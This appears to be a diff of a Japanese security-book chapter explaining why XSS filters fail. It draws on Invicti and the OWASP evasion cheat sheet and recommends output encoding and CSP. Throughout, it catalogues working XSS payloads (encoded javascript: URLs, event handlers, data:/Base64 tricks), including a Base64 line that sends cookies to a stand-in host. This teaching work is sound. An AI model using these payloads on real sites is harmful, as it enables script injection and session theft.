-> 「`<script>` タグの注入は通常ブロックされるが、攻撃者は `onerror`・`onclick`・`onfocus` などの**イベントハンドラ（event handler: 特定の出来事＝クリックや読み込み失敗などが起きたときに実行されるコードを指定する属性）**を使い、ユーザーの操作やページの状態変化に応じてJavaScriptを実行する。」
+Invictiの記事が最終的に強調するのは、次の4点の組み合わせです。
 
-`<img src=x onerror=alert(1)>` は `<script>` を一文字も含みませんが、画像読み込みが失敗した瞬間にJavaScriptが走ります。JavaScriptを起動できる「入口」はタグ・属性・スキーム（`javascript:` や `data:`）・CSS など多岐にわたり、`<script>` はそのごく一部にすぎません。
+1. **ブラックリスト方式・正規表現ベースの検査は常に「知られている攻撃パターン」を後追いする**。新しいブラウザ機能やパーサーの挙動が発見されるたびに、新しい回避手法が生まれる。
+2. **ブラウザは仕様上「寛容な」パーサーである**。閉じタグの欠落、属性値の引用符省略、不正な構文でも「できる限り解釈しようとする」ため、フィルタが想定する「正しいHTML」の形をしていない入力でも実行に至る。
+3. **文脈（コンテキスト）によって同じ文字列の危険性が変わる**。HTML本文・属性値・URL・CSS・JavaScript文字列リテラルのそれぞれで、危険な文字とエスケープ規則が異なるため、単一のフィルタルールで全文脈をカバーすることはできない。
+4. **DOMベースXSSはサーバーを経由しない**ため、サーバーサイドのどんなフィルタも原理的に無力である。
 
-#### 1.4 エンコーディングは「入れ子」にできる
+その上でInvictiが推奨する対策は、フィルタ（入力のブラックリスト検査）ではなく、次の組み合わせです。
 
-> 「攻撃者は1文字〜複数文字をさまざまな形式でエンコードでき、しかもエンコーディングは異なる方式で入れ子（nested）にできる。複数のエンコード方式を組み合わせられるため、検出はさらに困難になる。」
+- **すべての出力を、出力先の文脈に応じて正しくエンコード・エスケープする**（HTMLエンティティエンコード、JavaScript文字列エスケープ、URLエンコードなど、文脈ごとに異なる規則を適用する。これは後続のセクションで扱う「コンテキストに応じた出力エンコーディング」の考え方そのものです）。
+- **Content Security Policy（CSP）** を設定し、インラインスクリプトの実行やスクリプトの読み込み元をホワイトリスト化することで、フィルタをすり抜けたペイロードが仮に注入されても実行されない多層防御を敷く。
+- **定期的な脆弱性スキャン**によって、新しいコードパスや設定変更で生まれた抜け穴を継続的に発見する。
 
-たとえば `javascript:` を、HTML実体参照（`&#106;...`）→URLエンコード（`%6A...`）→さらにその一部だけ16進、と多層に包めます。フィルタはどこか一段だけデコードして検査しがちですが、ブラウザは文脈に応じて何段もデコードしてから実行します。**フィルタのデコード段数とブラウザのデコード段数がずれる**限り、抜け道が残ります。
-
-#### 1.5 結論：フィルタ／WAFは「安心という幻想」を生む
-
-Invictiの結論は明快です。
-
-> 「特定のペイロードをブロックしても、根本の脆弱性を直さなければ、“安全になったという誤った安心感（a false sense of security）”を生むだけで、WAFが検知できない新しいペイロードには依然として無防備なままだ。」
-
-> 「どれほど複雑なXSSフィルタや優秀なWAFを用意しても、賢いハッカーが侵入路を見つけないことを完全に保証することは決してできない。」
-
-ここで **WAF（Web Application Firewall: Webアプリの前段に置き、通信を監視して既知の攻撃パターンを遮断する防御機器・サービス）** は、既知の露骨なペイロードを弾く一時的な緩和策にはなるものの、「アプリケーションの文脈（そのデータが最終的にどこでどう使われるか）」を持たないため、ソースコード側の正しい対策の**代替にはならない**と位置づけられます。
-
-そしてInvictiが示す唯一信頼できる方向性が次です。
-
-> 「XSSとフィルタ回避を確実に防ぐ唯一の方法は、“フィルタリング（filtering）”ではなく“エスケープ（escaping）”を使うことである。」
-
-この「エスケープ／出力エンコーディング」中心の防御論は本章末（1.10）と第1章の防御セクションで深掘りするため、ここでは「フィルタは戦略的に負ける／エスケープが正攻法」という結論だけ押さえてください。
-
-> 出典: XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting (Invicti) — https://www.invicti.com/blog/web-security/xss-filter-evasion
+> 出典: XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting — https://www.invicti.com/blog/web-security/xss-filter-evasion
 
 ---
 
-### 2. OWASPフィルタ回避チートシートの位置づけと読み方
+### 2. OWASP XSS Filter Evasion Cheat Sheet：回避技法の実物カタログ
 
-OWASP XSS Filter Evasion Cheat Sheetは、上記Invictiの主張を「具体的な弾丸」で裏づける資料です。もともとはRSnake（Robert Hansen）が公開した伝説的な「XSS Cheat Sheet」を起源とし、現在はOWASPが保守しています。
+OWASPのチートシートは、RSnakeが2000年代に作成した原本を土台に、コミュニティが継続的に更新している「フィルタ回避ペイロード集」です。単なる寄せ集めではなく、**「ブラウザのパーサーがどこまで寛容か」を体系的に突く実験の記録**として読むと理解が深まります。以下、原理ごとに分類して主要な技法を示します。
 
-チートシートは冒頭で自らの目的をこう明言します。
+#### (1) 文字エンコーディングの多重化
 
-> 「この記事は、アプリケーションセキュリティのテスト担当者に向けて、**特定のXSS防御フィルタをすり抜けられる一連のXSS攻撃**を提供することで、入力フィルタリングがXSSに対する不完全な防御であることを実証するものである。」
+```html
+<!-- 10進数のHTML数値文字参照。セミコロンは省略可能 -->
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
 
-つまりこれは「攻撃者のための攻撃辞書」であると同時に、「フィルタは破れる、という主張の証拠集」でもあります。防御側にとっては「自分のフィルタがこれらに耐えられるか」のテストケース集として使います。
+<!-- 16進数の数値文字参照。0埋めのパディングも許容される -->
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>
+```
 
-重要な前提として、掲載ペイロードの多くは**ブラウザ・バージョン依存**です。とりわけ古いInternet Explorer（Trident）や旧Firefox（Gecko）の独自挙動を突くものが多く、現在のモダンブラウザでは動かないものが相当数あります（第9節で「陳腐化」の注意として整理します）。しかし「なぜ当時動いたのか」の原理はいまも有効で、現代の回避（サニタイザ回避やmutation XSSなど）を理解する土台になります。
+これが動く理由は、HTMLパーサーの仕様で**数値文字参照はセミコロンなしでも、また先頭にゼロを重ねてパディングしても（最大7桁程度まで）有効な文字として解釈される**と定められているためです。フィルタが `javascript:` という生の文字列だけを検査対象にしていると、この形はテキストとしては一致しないため素通りしてしまい、ブラウザが `href` 属性値をパースする段階で初めて `javascript:alert(1)` へとデコードされ、クリック時に実行されます。「フィルタが見る文字列」と「ブラウザが実行する文字列」が異なる、という原則の最も基本的な例です。
 
-> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+#### (2) 空白・制御文字によるキーワード分断
 
-以下、チートシートの技法を系統立てて解説します。ペイロードは原文のものを再現し、それぞれに「なぜ動くのか」を一文添えます。
+```html
+<img src=x onerror="jav&#x09;ascript:alert(1)">
+<a href="jav&#x0A;ascript:alert(1)">click</a>
+```
+
+ASCIIコード1〜32の範囲に含まれるタブ（`&#x09;`）や改行（`&#x0A;`）、キャリッジリターン（`&#x0D;`）といった制御文字を `javascript` という単語の途中に挟み込みます。フィルタが単純な文字列一致（`indexOf("javascript:")` のような検査）を行っている場合、間に別の文字が挟まった時点で一致しなくなります。一方でブラウザ側のURLパーサーは、`javascript:` プロトコルを認識する際にこうした制御文字を**無視して読み飛ばす**仕様になっているため、実行時には正しく `javascript:alert(1)` として解釈されます。
+
+#### (3) タグ・属性構造の悪用
+
+```html
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT a=">" SRC="https://xss.rocks/xss.js"></SCRIPT>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+```
+
+1つ目は、フィルタが `<script>...</script>` というペアを一括で除去する実装だった場合、外側の余分な `<` を残したまま内側の `<SCRIPT>` だけを消してしまうと、**除去後に再びタグとして成立する文字列が残る**ことを利用しています(「1回だけの置換」対「多重にネストした入力」というフィルタの典型的な弱点)。2つ目は、`SRC` 属性の前にある `a=">"` という無意味な属性が、フィルタの単純な「`>` が現れたらタグ終了とみなす」ロジックを惑わせるために置かれています。3つ目は、意味を持たない `"""` という壊れた属性値をブラウザが「エラー回復」して読み飛ばし、後続の `<SCRIPT>` を独立したタグとして解釈してしまう例です。これらはいずれも、**HTMLパーサーが仕様上「不正な入力に対してもできる限り復旧してレンダリングを続ける」という設計**を突いています。ブラウザは「壊れたページでも表示し続ける」ことをユーザー体験のために優先しており、この寛容さがセキュリティ上は攻撃面になります。
+
+#### (4) `<script>` 以外のタグによる代替
+
+```html
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=data:text/html,<script>alert(1)</script>>
+```
+
+`<script>` タグそのものが完全にブロックされている場合でも、**HTML仕様上スクリプトを実行できる経路は `<script>` だけではありません**。`<svg>` 要素の `onload` 属性、`<body>` の `onload`、`<iframe>` の `src="javascript:..."`、`<embed>` の `data:` URIスキームなど、いずれもブラウザが正規にサポートする機能の組み合わせでJavaScriptの実行に到達できます。フィルタが「危険なタグ」のリストとして `script`, `iframe` などいくつかを列挙していても、HTML5で定義されている要素・属性の組み合わせの総数は非常に多く、リストの完全性を保証することは事実上不可能です。
+
+#### (5) イベントハンドラの非英数字区切り
+
+```html
+<svg onload=alert(1)>
+<svg%0Aonload=alert(1)>
+<img src=x onerror!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
+```
+
+属性名と `=` の間に、スペース以外の非表示・非英数字文字を挟んでもブラウザは属性として認識します。フィルタが `onerror=` のように等号まで含めて完全一致を検査していると、余計な文字が挟まった時点ですり抜けます。
+
+#### (6) スタイル（CSS）ベースの攻撃と`expression()`
+
+```html
+<div style="background-image: url(javascript:alert('XSS'))">
+<style>.xss{background-image:url("javascript:alert('XSS')");}</style>
+<img style="xss:expression(alert('XSS'))">
+```
+
+`expression()` はIE固有の「CSSプロパティ値としてJavaScriptを評価する」機能で、既に全ブラウザで廃止されています（IE自体がサポートを終了）。しかし `url(javascript:...)` のようにCSSのプロパティ値としてURLスキームを解釈させる手法は、CSSパーサーとURLスキーム判定が独立した処理系として実装されている場合に有効な、より一般的な「文脈をまたいだ解釈のズレ」を突く例として学ぶ価値があります。
+
+#### (7) URL・ドメインホワイトリストの回避
+
+チートシートは、ドメインを許可リストで制限するタイプのフィルタに対する回避法も扱っています。
+
+- IPアドレスを10進数一つに変換する（例: `http://1113982867/` のように4バイトを1つの32bit整数として表現）、16進数（`http://0x42.0x66.0x7.0x93/`）、8進数表記に変換する。
+- `http://www.google.com./` のように末尾にドットを付ける（DNS的には同じホストだが文字列としては異なる）。
+- プロトコルを省略したプロトコル相対URL（`//evil.com/`）を使う。
+
+いずれも「文字列としては許可リストの正規表現に一致しないが、ブラウザ・OSのネットワークスタックは同じ宛先として解決する」という、**検査系とランタイムの解釈の不一致**を突く点で共通しています。
+
+#### (8) HTTPパラメータ汚染（HPP）とWAF回避の応用例
+
+チートシートはさらに、同じパラメータ名を持つクエリを複数個含めることで、WAFが検査する値とアプリケーションサーバーが実際に使う値をずらす**HTTP Parameter Pollution**にも触れています。サーバー言語・フレームワークによって「複数の同名パラメータのうちどれを採用するか（最初/最後/配列として全部）」の実装が異なるため、WAFが最初のパラメータだけを検査し、アプリケーションが最後のパラメータを使う組み合わせが存在すると、悪意あるペイロードだけをアプリケーションに届けることができます。
 
 ---
 
-### 3. 基本のバリエーション：大文字小文字・引用符・属性の“ゆらぎ”
+### 3. 2つの資料をつなぐ「原理」の整理
 
-最初のグループは、最も素朴なフィルタ（「`<script>` という文字列を探す」「`javascript` という語を探す」）を破る、表面的だが本質的な変形です。
+ここまで見た個別技法はいずれも、次の4つの原理のどれか（あるいは複数）に還元できます。
 
-#### 3.1 大文字小文字混在
+1. **検査タイミングと実行タイミングのズレ**（デコード段階の違い）: フィルタは「今この瞬間の文字列」を見るが、ブラウザは複数段階のデコード・パース処理を経て初めて最終的な意味を確定する。数値文字参照、URLエンコード、Base64はすべてこの原理を利用する。
+2. **パーサーの寛容さ（エラー回復）**: HTMLは「壊れた入力でも表示を続ける」という設計思想を持つため、フィルタが期待する「正しい構文」から外れた入力でも、ブラウザは独自の復旧ロジックで解釈を続けてしまう。
+3. **攻撃対象の組み合わせ爆発**: HTML要素・属性・イベントハンドラの組み合わせは非常に多く、ブラックリストで全てを列挙することは現実的に不可能。新しいHTML/CSS/JS機能が追加されるたびに新しい経路が生まれる。
+4. **文脈依存性**: 同じ文字列（`"`、`<`、`javascript:` など）でも、出現する場所（HTML本文/属性値/URL/CSS/JS文字列リテラル）によって危険性とエスケープ規則がまったく異なる。単一の正規表現ですべての文脈を安全にすることはできない。
 
-```html
-<IMG SRC=JaVaScRiPt:alert('XSS')>
-```
+Invictiの記事はこれを「フィルタリングは本質的に不完全である」という結論に集約し、OWASPのチートシートはその結論を裏付ける実物証拠を大量に積み上げている、という関係になります。両者を合わせて読むことで、読者は「なぜこのペイロードが動くのか」だけでなく「なぜフィルタという発想自体が敗北するのか」という、より高い抽象度の理解に到達できます。
 
-なぜ動くか: HTMLのタグ名・属性名・`javascript:` スキーム名はいずれも**大文字小文字を区別しない**。フィルタが小文字の `javascript` だけを探していると、`JaVaScRiPt` を見逃す。
+### 4. 実務上の結論：フィルタの代わりに何をすべきか
 
-#### 3.2 引用符の有無・種類のゆらぎ
+この2つの資料が一致して示す結論は明快です。**入力のブラックリスト検査（フィルタ）を主たる防御として設計してはならない**。代わりに次を組み合わせます。
 
-```html
-<IMG SRC=javascript:alert('XSS')>
-<IMG SRC="javascript:alert('XSS')">
-<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
-```
+- **文脈に応じた出力エンコーディング**（HTMLエンティティエンコード、JavaScript文字列エスケープ、URLエンコード、CSSエスケープをそれぞれの出力先に応じて機械的に適用する。これは「何が危険か」を判定する必要がなく、常に安全側に倒せるため、ブラックリストより原理的に堅牢です）。
+- **Content Security Policy（CSP）** による実行時の多層防御。仮にフィルタや出力エンコーディングをすり抜ける入力があっても、インラインスクリプトの実行を許さない、外部スクリプトの読み込み元を限定するといったポリシーがあれば、攻撃の実害化を防げる可能性が高まります（CSPの詳細とそのバイパス手法自体は、本書の第4章で個別に扱います）。
+- **継続的な脆弱性スキャン・ペネトレーションテスト**によって、コードの変更・新機能の追加のたびに新しい抜け穴が生まれていないかを検証し続けること。
 
-なぜ動くか: HTML属性値は「二重引用符」「一重引用符」「引用符なし」のいずれでも書ける。さらに古いIEはバッククォート `` ` `` すら引用符として受理した。フィルタが特定の引用符スタイルだけを想定していると破られる。
+フィルタは「多層防御の一枚」としては無意味ではありませんが、それを最終防衛線として設計した瞬間に、攻撃者が持つ「数百から数千通り」の回避技法との非対称な競争に晒されることになります。次のセクション以降では、この文脈依存性（HTML本文・属性・URL・JS・CSSそれぞれのエスケープ規則）と、実際にどのようなペイロードが各文脈で機能するのかを、さらに具体的に掘り下げていきます。
 
-#### 3.3 属性値の途中に無意味な断片・空白を挟む
-
-```html
-<IMG SRC=" onmouseover="alert('xxs')">
-<IMG onmouseover="alert('xxs')">
-<IMG SRC=# onmouseover="alert('xxs')">
-```
-
-なぜ動くか: `src` の値がなくても（あるいは無効でも）、`onmouseover` などのイベントハンドラ属性さえ生き残れば実行される。フィルタが「`src=javascript:` の形」だけを警戒していると、イベントハンドラ経由の実行を止められない。
-
-#### 3.4 タグ名と属性の区切りをスラッシュにする
-
-```html
-<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
-```
-
-なぜ動くか: HTMLパーサはタグ名と属性の区切りに空白だけでなくスラッシュ `/` も受理する。`<script src=...>` を正規表現で厳密に空白区切りで探すフィルタは、`/` 区切りを取りこぼす。
-
-#### 3.5 イベントハンドラ名の直後に非英数字を詰め込む（Gecko）
-
-```html
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
-```
-
-なぜ動くか: 旧Geckoエンジンは、属性名 `onload` と等号 `=` の間に大量の非英数字が挟まっても、それらを無視して属性として解釈した。属性名を正規表現で厳密に照合するフィルタを崩す。（現行ブラウザでは不成立。原理として理解する例。）
-
----
-
-### 4. 文字参照（実体参照）エンコーディング
-
-ここからがフィルタ回避の主戦場です。**文字参照（character reference／実体参照 entity reference: `&#106;` や `&#x6A;` のように、1文字を数値コードで表す記法。ブラウザは表示・解釈の前にこれを元の文字へ復号する）**を使うと、`javascript` という語を一文字も「そのまま」書かずに表現できます。
-
-#### 4.1 10進数の実体参照
-
-```html
-<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
-```
-
-なぜ動くか: これは `javascript:alert('XSS')` を1文字ずつ10進数実体参照にしたもの。フィルタは `href` の中に `javascript` という文字列を見つけられないが、ブラウザは属性値を解釈する前に実体参照を復号し、`javascript:` スキームとして実行する。
-
-#### 4.2 16進数の実体参照（かつ末尾セミコロンを省略）
-
-```html
-<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click</a>
-```
-
-なぜ動くか: 実体参照は16進（`&#x...`）でも書け、しかも**末尾のセミコロン `;` を省略しても**多くのブラウザは復号する。フィルタが「`&#\d+;`（10進かつセミコロン付き）」というパターンだけを想定していると、16進＋セミコロン無しの二重の変形で抜けられる。
-
-#### 4.3 先頭ゼロによるパディング
-
-```html
-<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058...">Click</a>
-```
-
-なぜ動くか: 数値実体参照は**先頭のゼロ（padding）を任意個数付けても同じ文字**として復号される（1〜7桁程度まで許容し、先頭ゼロは無視される）。つまり同じ1文字に無限通りの表記があり、フィルタは全パターンを列挙できない。これは1.2で述べた「同じものを何通りにも書ける」原理の具体例。
-
-> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
----
-
-### 5. 制御文字・空白・Nullバイトによる「キーワード分断」
-
-`javascript:` という危険なキーワードそのものを、途中に「ブラウザは無視するが文字列としては割り込む」文字を挟んで分断する技法です。
-
-#### 5.1 タブ・改行・復帰の埋め込み
-
-```html
-<a href="jav	ascript:alert('XSS');">Click Me</a>
-<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
-<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
-```
-
-なぜ動くか: `jav` と `ascript` の間に、水平タブ（ASCII 0x09）・改行（0x0A）・復帰（0x0D）を「生の文字」または実体参照で挿入している。ブラウザはスキーム名 `javascript` の内部にあるこれらの空白・制御文字を**取り除いてから**解釈するため、依然として `javascript:` と認識する。一方フィルタは `jav\tascript` を `javascript` と一致させられない。1文字目の例のタブは、原文では生のタブ文字が埋め込まれている点に注意。
-
-#### 5.2 Nullバイト（ヌルバイト）注入
-
-```
-perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
-```
-
-なぜ動くか: **Nullバイト（null byte: 値がゼロの1バイト。C言語系では文字列の終端記号）**を `java` と `script` の間に挟む。かつてのIEはこのNull（`\0`、URL上では `%00`）を無視してタグを解釈したが、C言語で書かれた検査ロジックはNullで文字列が終わったと誤認し、そこで検査を打ち切ってしまう。**ブラウザとフィルタの文字列終端の解釈差**を突く古典。
-
-#### 5.3 「空白扱いされる制御文字」を先頭に置く
-
-```html
-<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
-```
-
-なぜ動くか: `href` の値の先頭にある空白や制御文字（ここでは `&#14;`）を、ブラウザはトリム（除去）してから `javascript:` を認識する。フィルタが「`javascript:` で始まる値」だけを危険視していると、前置きされたゴミで先頭一致を外せる。ASCII 1〜32付近の多くの文字がこの用途に使える。
-
-> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
----
-
-### 6. タグ構造の破壊とブラウザの自動修復
-
-1.1で述べた「ブラウザは壊れたHTMLを直して実行する」を、実際のペイロードで体感する節です。ここが**フィルタ回避の理論的な核心**です。
-
-#### 6.1 余分な引用符・角括弧でパーサを混乱させる
-
-```html
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
-<<SCRIPT>alert("XSS");//\<</SCRIPT>
-```
-
-なぜ動くか: 1行目は、壊れた `<IMG """>` をブラウザが「不正な img タグ」として処理・修復した結果、後続の `<SCRIPT>` が独立したタグとして生き残り実行される。2行目の `<<SCRIPT>` は、先頭の余分な `<` をブラウザがテキストとして捨て、`<SCRIPT>` を正しいタグとして拾う。**フィルタは「壊れた文字列」を見て安全と誤判定するが、ブラウザは修復して危険なツリーを作る**——非対称性そのもの。
-
-#### 6.2 閉じ忘れ・省略
-
-```html
-<SCRIPT SRC=http://xss.rocks/xss.js?< B >
-<SCRIPT SRC=//xss.rocks/.j>
-```
-
-なぜ動くか: 1行目は `</script>` を書かず、代わりに `< B >` で「次のタグ開始」らしきものを与えることで、ブラウザにスクリプト部の終端を推測・補完させる。2行目はプロトコル（`http:`）とファイル拡張子（`.js`）を省略してもブラウザが補完して読み込む。厳密な文法を期待するフィルタほど、この「省略に強いブラウザ」に負ける。
-
-#### 6.3 タグ内でのHTMLコメントによる分断
-
-```html
-<IMG SRC="javas<!-- -->cript:alert('XSS')">
-```
-
-なぜ動くか: 一部の文脈でブラウザはコメント `<!-- -->` を除去してから値を解釈し、`javascript:` を復元する。フィルタはコメントで分断された `javas...cript` を危険語と認識できない。
-
-> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
----
-
-### 7. 代替タグとイベントハンドラ：`<script>` に頼らない実行経路
-
-Invictiの1.3を、OWASPの具体例で網羅します。JavaScriptを起動できる「入口」がいかに多いかを示すカタログです。
-
-#### 7.1 画像タグと `onerror`
-
-```html
-<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
-<IMG SRC=x onerror="alert('XSS')">
-```
-
-なぜ動くか: `src` に無効な値を与えると画像読み込みが必ず失敗し、`onerror` に指定したコードが実行される。`<script>` を含まず、正当なタグ（img）だけで成立するため、タグ単位のブラックリストをすり抜ける。`String.fromCharCode(88,83,83)` は文字コードから `"XSS"` を生成しており、引用符や文字列そのものをフィルタされても値を組み立てられる。
-
-#### 7.2 SVGの `onload`（現代でも有効な代表格）
-
-```html
-<svg/onload=alert('XSS')>
-```
-
-なぜ動くか: SVG要素は読み込み完了時に `onload` を発火する。短く、引用符も空白も最小限で書けるため、現在も生きたペイロードとして頻出。**名前空間の切り替え**（後述9.2）とも絡み、サニタイザ回避の主役でもある。
-
-#### 7.3 IE独自の代替ソース属性（歴史的）
-
-```html
-<IMG DYNSRC="javascript:alert('XSS')">
-<IMG LOWSRC="javascript:alert('XSS')">
-<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
-<BODY BACKGROUND="javascript:alert('XSS')">
-<TABLE BACKGROUND="javascript:alert('XSS')">
-```
-
-なぜ動くか: 旧IEは `dynsrc`・`lowsrc`・`background` など、画像URLを取る多数の属性で `javascript:` スキームを実行した。「危険なのは `src` だけ」という思い込みを崩す例（現行ブラウザでは不成立）。
-
-#### 7.4 iframe・frame・object・embed
-
-```html
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
-<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
-<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
-<EMBED SRC="data:image/svg+xml;base64,PHN2Zy...=="></EMBED>
-```
-
-なぜ動くか: 埋め込み系タグは外部・インラインのコンテンツをロードでき、その中でスクリプトが走る。とくに `data:` スキーム（後述8.2）と組み合わせると、外部サーバすら不要でSVG内スクリプトを実行できる。
-
-#### 7.5 BASEタグによる相対URLの乗っ取り
-
-```html
-<BASE HREF="javascript:alert('XSS');//">
-```
-
-なぜ動くか: `<base>` はページ内の相対URLの基準を書き換える。基準を `javascript:` にすると、後続の相対リンク・スクリプト読み込みがすべて汚染される。ページの一部分だけを注入できる状況で威力を持つ。
-
-> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
----
-
-### 8. JavaScript／URLレベルの難読化
-
-`<script>` の実行までは通っても、その中身（`alert` や文字列）をフィルタされる場合に、コードそのものを覆い隠す技法です。
-
-#### 8.1 `String.fromCharCode` と Unicodeエスケープ
-
-```html
-<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
-<form><a href="javascript:alert(1)">X</a></form>
-```
-
-なぜ動くか: `String.fromCharCode(88,83,83)` は数値から文字列を組み立てるので、フィルタしたい文字（引用符や `XSS`）を一切書かずに値を作れる。`alert` は `alert` の `a` をUnicodeエスケープ（`a`＝`a`）で表したもので、JavaScriptエンジンは字句解析（トークン化）の段階でこれを `a` に復号するため、識別子として正しく `alert` になる。**フィルタは `alert` という並びを見つけられないが、エンジンにとっては同一**。
-
-#### 8.2 `data:` スキームとBase64
-
-```html
-<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
-<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"></iframe>
-<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
-```
-
-なぜ動くか: **`data:` スキーム（URL自体にコンテンツの中身を埋め込む記法。外部サーバを介さずにHTML/画像等を供給できる）**にHTML文書やスクリプトをそのまま、あるいはBase64（任意のバイト列を英数字だけで表す符号化）で包んで置く。`atob()` はBase64を復号する組み込み関数で、`eval(atob('...'))` は「復号してから実行」を意味する。フィルタが英数字の羅列（Base64）を危険と気づけない点を突く。
-
-#### 8.3 `alert` そのものの難読化（プロトタイプチェーンの悪用）
-
-```js
-(alert)(1)
-a=alert,a(1)
-[1].find(alert)
-top["al"+"ert"](1)
-top[/al/.source+/ert/.source](1)
-alert(1)
-top['al\145rt'](1)
-top[8680439..toString(30)](1)
-alert?.()
-```
-
-なぜ動くか: JavaScriptでは、関数はオブジェクトのプロパティとしてブラケット記法（`obj["name"]`）でも呼べる。`top` はグローバルオブジェクト（ブラウザでは `window`）を指し、そのプロパティ探索は**プロトタイプチェーン（prototype chain: オブジェクトが自分に無いプロパティを、親→その親…とたどって探す仕組み）**の先頭であるグローバルスコープに解決される。つまり `top["alert"]` は `window.alert` と同じ。あとは `"al"+"ert"`（文字列結合）、`/al/.source+/ert/.source`（正規表現リテラルの `source` から文字列を取り出して結合）、`'al\145rt'`（8進エスケープ `\145`＝`e`）、`8680439..toString(30)`（30進数へ基数変換すると文字列 `"alert"` になる）など、**「`alert` という連続した文字列を一度も書かずに」同じプロパティ名を生成**している。ブラックリストで語 `alert` を弾いても、これらは素通りする。`alert?.()` はオプショナルチェーン `?.` を使い、`alert(` という並びすら崩している。
-
-> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
----
-
-### 9. CSS・メタ・サーバサイド・その他の“隙”
-
-#### 9.1 スタイルシート経由（主に旧IE）
-
-```html
-<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
-<DIV STYLE="background-image: url(javascript:alert('XSS'))">
-<DIV STYLE="width: expression(alert('XSS'));">
-<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
-<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
-```
-
-なぜ動くか: 旧IEはCSSの `expression()`（CSS値をJavaScript式で計算するIE独自拡張）や `url(javascript:...)` を実行し、旧Firefoxは `-moz-binding`（XBLという仕組みで要素に振る舞いを束縛するGecko拡張）で外部スクリプトを読み込めた。「CSSは見た目だけで無害」という思い込みを崩す例。`@import` は外部CSSを読み込む指令。（`expression`・`-moz-binding` は現行ブラウザで廃止済み。原理として押さえる。）
-
-#### 9.2 メタリフレッシュとURLパラメータ操作
-
-```html
-<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
-<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
-```
-
-なぜ動くか: `<meta http-equiv="refresh">` は指定秒後に指定URLへ遷移させる。その遷移先に `javascript:` を置くと実行される。`url=` を二重に書く2行目は、フィルタが最初の `url=` だけを検査する挙動を突く。
-
-#### 9.3 サーバサイド・インクルードと条件付きコメント
-
-```html
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
-<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
-```
-
-なぜ動くか: 1行目はSSI（Server Side Includes: サーバがHTML内の特殊コメントをコマンドとして実行する機能）を悪用し、`<SCR`＋`IPT ...`を**サーバ側で結合**して完成した `<SCRIPT>` を出力する。フィルタが見る入力には完全な `<SCRIPT>` が存在しない。2行目はIEのダウンレベル隠しコメント（`[if gte IE 4]`＝IE4以上でのみ有効な条件分岐コメント）で、非IEブラウザやフィルタにはただのコメントに見える。
-
